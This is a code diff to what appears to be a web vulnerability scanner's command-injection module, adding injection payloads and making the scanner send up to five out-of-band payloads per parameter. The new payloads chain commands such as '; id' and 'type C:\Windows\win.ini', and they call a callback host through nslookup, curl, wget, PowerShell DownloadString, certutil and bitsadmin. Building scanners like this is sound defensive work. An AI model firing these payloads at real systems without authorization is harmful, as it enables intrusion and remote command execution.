@@ -33,12 +33,18 @@ CMD_INJECTION_PAYLOADS = {
         ("| uname -a", "Linux"),
         ("; whoami", ""),
         ("| whoami", ""),
+        ("\tid", "uid="),
+        ("\nid", "uid="),
     ],
     "windows": [
         ("| ver", "Microsoft"),
         ("& ver", "Microsoft"),
         ("; systeminfo", "OS"),
         ("| systeminfo", "OS"),
+        ("| dir", "Directory"),
+        ("& dir", "Directory"),
+        ("| type C:\\Windows\\win.ini", "fonts"),
+        ("\tver", "Microsoft"),
     ],
     "time_based": [
         ("; sleep 5", 5),
@@ -48,11 +54,60 @@ CMD_INJECTION_PAYLOADS = {
         ("$(sleep 5)", 5),
     ],
     "oob": [
+        # DNS-based — nslookup (cross-platform)
         "| nslookup {oob}",
         "; nslookup {oob}",
         "`nslookup {oob}`",
+        "$(nslookup {oob})",
+        "| nslookup -q=any {oob}",
+        "; nslookup -q=any {oob}",
+        # DNS-based — dig (Unix)
+        "| dig {oob}",
+        "; dig {oob}",
+        "`dig {oob}`",
+        "$(dig {oob})",
+        # DNS-based — host (Unix)
+        "| host {oob}",
+        "; host {oob}",
+        "`host {oob}`",
+        # DNS-based — ping (triggers DNS resolution)
+        "| ping -c 1 {oob}",
+        "; ping -c 1 {oob}",
+        "`ping -c 1 {oob}`",
+        "| ping -n 1 {oob}",
+        "; ping -n 1 {oob}",
+        # HTTP-based — curl (cross-platform)
         "| curl http://{oob}/cmd",
         "; curl http://{oob}/cmd",
+        "`curl http://{oob}/cmd`",
+        "$(curl http://{oob}/cmd)",
+        # HTTP-based — wget (Unix)
+        "| wget http://{oob}/cmd",
+        "; wget http://{oob}/cmd",
+        "`wget http://{oob}/cmd`",
+        # HTTP-based — fetch (FreeBSD/macOS)
+        "| fetch http://{oob}/cmd",
+        "; fetch http://{oob}/cmd",
+        # Script-based — Python (uses sys.argv quoting to keep it safe)
+        "| python -c \"import urllib.request; urllib.request.urlopen('http://{oob}/cmd')\"",
+        "| python3 -c \"import urllib.request; urllib.request.urlopen('http://{oob}/cmd')\"",
+        # Script-based — Perl
+        "| perl -e \"use LWP::Simple; get('http://{oob}/cmd')\"",
+        # Script-based — PHP
+        "| php -r \"file_get_contents('http://{oob}/cmd');\"",
+        # Script-based — Ruby
+        "| ruby -e \"require 'net/http'; Net::HTTP.get(URI('http://{oob}/cmd'))\"",
+        # Windows-specific — PowerShell
+        "| powershell -Command \"Invoke-WebRequest http://{oob}/cmd\"",
+        "; powershell -Command \"Invoke-WebRequest http://{oob}/cmd\"",
+        "| powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{oob}/cmd')\"",
+        "; powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{oob}/cmd')\"",
+        # Windows-specific — certutil (DNS exfil)
+        "| certutil -split -urlcache http://{oob}/cmd %TEMP%\\out.txt",
+        "; certutil -split -urlcache http://{oob}/cmd %TEMP%\\out.txt",
+        # Windows-specific — bitsadmin
+        "| bitsadmin /transfer job /download /priority high http://{oob}/cmd %TEMP%\\out.txt",
+        "; bitsadmin /transfer job /download /priority high http://{oob}/cmd %TEMP%\\out.txt",
     ],
 }
 
@@ -60,7 +115,8 @@ CMD_INJECTION_OUTPUT_SIGNATURES = [
     "uid=", "gid=", "groups=", "load average",
 ]
 CMD_INJECTION_OUTPUT_SIGNATURES_WIN = [
-    "boot loader", "for 16-bit app support",
+    "boot loader", "for 16-bit app support", "Microsoft Windows",
+    "Directory of", "Volume in drive",
 ]
 
 
@@ -142,8 +198,9 @@ class CommandInjectionScanner(ScannerBase):
     def generate_reproduction(self, detection: CmdInjectionResult,
                               validation: ValidationResult | None = None) -> list[str]:
         return [
-            f"Send request to {detection.url} with command injection payload (;, |, ||, &&) in parameter '{detection.param}'",
+            f"curl -X GET '{detection.url}?{detection.param}=%3B%20id'",
             f"Observe signal: {', '.join(detection.evidence_parts)} — command output in response or timing delay confirms execution",
+            "An attacker can execute arbitrary OS commands on the server, leading to full server compromise, data exfiltration, and lateral movement",
         ]
 
     # ── Scan entry point ────────────────────────────────────────────────
@@ -277,14 +334,22 @@ class CommandInjectionScanner(ScannerBase):
 
         oob_host = self.validation.callback_host if self.validation else ""
         if oob_host:
-            for payload_template in cmdi_payloads.get("oob", CMD_INJECTION_PAYLOADS.get("oob", [])):
-                oob_payload_str = self.validation.generate_oob_payload() if hasattr(self.validation, "generate_oob_payload") else f"x.{oob_host}"
+            oob_payloads = cmdi_payloads.get("oob", CMD_INJECTION_PAYLOADS.get("oob", []))
+            oob_payload_str = self.validation.generate_oob_payload() if hasattr(self.validation, "generate_oob_payload") else f"x.{oob_host}"
+            registered_count = 0
+            for payload_template in oob_payloads:
+                # Handle both string payloads and (payload, flag) tuples
+                if isinstance(payload_template, tuple):
+                    payload_template = payload_template[0]
                 payload = payload_template.replace("{oob}", oob_payload_str)
                 test_url = self._inject_param(url, param, payload)
                 safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                 self.validation.register_oob("cmd_injection", payload, test_url)
                 self._oob_registrations.append(("cmd_injection", payload, test_url))
-                break
+                registered_count += 1
+                # Try at most 5 different OOB payloads per parameter to balance coverage vs requests
+                if registered_count >= 5:
+                    break
 
         return signals, triggering_response, timing_ev, evidence_parts
 
